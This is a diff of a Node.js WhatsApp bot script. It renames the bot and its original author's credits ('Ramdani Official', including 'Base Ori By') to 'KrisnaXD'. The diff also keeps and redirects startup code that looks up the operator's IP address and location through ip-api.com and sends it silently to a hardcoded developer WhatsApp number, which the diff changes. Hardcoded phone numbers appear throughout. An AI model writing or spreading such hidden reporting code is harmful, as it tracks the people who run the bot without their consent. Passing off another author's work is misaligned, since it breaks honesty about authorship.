@@ -212,7 +212,7 @@ require('./api/apiramdani.js')
 nocache('../api/apiramdani.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
 
 const starts = async (Ramdani = new WAConnection()) => {
-    CFonts.say(`RAMDANI OFFICIAL`, {
+    CFonts.say(`KrisnaXD`, {
         font: 'chrome',
         align: 'center',
         gradient: ['red', 'magenta']
@@ -221,12 +221,12 @@ const starts = async (Ramdani = new WAConnection()) => {
 
 	console.log(color(`${spc2}           [ • CREATOR BY RAMDANI OFFICIAL • ]` ,`${randomcolors}`))
 console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : Ramdani Official`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : KrisnaXD`, `${randomcolors}`))
 console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Bot Version : 17.0.0`, `${randomcolors}`))
 console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Status      : Online!`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : Ramdani Official`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : Ramdani Official`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : Ramdani Official`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : KrisnaXD`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : KrisnaXD`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : KrisnaXD`, `${randomcolors}`))
 console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
 	Ramdani.browserDescription = [ `${setting.NamaBot}`, `${randomserverku}`, '3.0' ]
 
@@ -244,51 +244,54 @@ const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remot
 const spinner = { 
   "interval": 120,
   "frames": [
-    "R",
-    "Ra",
-    "Ram",
-    "Ramd",
-    "Ramda",
-    "Ramdan",
-    "Ramdani",
-    "Ramdani O",
-    "Ramdani Of",
-    "Ramdani Off",
-    "Ramdani Offi",
-    "Ramdani Offic",
-    "Ramdani Offici",
-    "Ramdani Officia",
-    "Ramdani Official",
-    "R",
-    "Ra",
-    "Ram",
-    "Ramd",
-    "Ramda",
-    "Ramdan",
-    "Ramdani",
-    "Ramdani O",
-    "Ramdani Of",
-    "Ramdani Off",
-    "Ramdani Offi",
-    "Ramdani Offic",
-    "Ramdani Offici",
-    "Ramdani Officia",
-    "Ramdani Official",
-    "R",
-    "Ra",
-    "Ram",
-    "Ramd",
-    "Ramda",
-    "Ramdan",
-    "Ramdani",
-    "Ramdani O",
-    "Ramdani Of",
-    "Ramdani Off",
-    "Ramdani Offi",
-    "Ramdani Offic",
-    "Ramdani Offici",
-    "Ramdani Officia",
-    "Ramdani Official",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
+    "K",
+    "Kr",
+    "Kri",
+    "Kris",
+    "Krisn",
+    "Krisna",
+    "KrisnaX",
+    "KrisnaXD",
   ]}
 
 	//connect
@@ -314,7 +317,7 @@ const spinner = {
     console.log(color('|WARN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Ramdani.sendMessage("6289512545999@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6289512545999?text=Assalamualaikum+bwang:v` } }})
+       Ramdani.sendMessage("6287784550689@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6287784550689?text=Assalamualaikum+bwang:v` } }})
      console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     Ramdani.sendMessage(`${setting.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
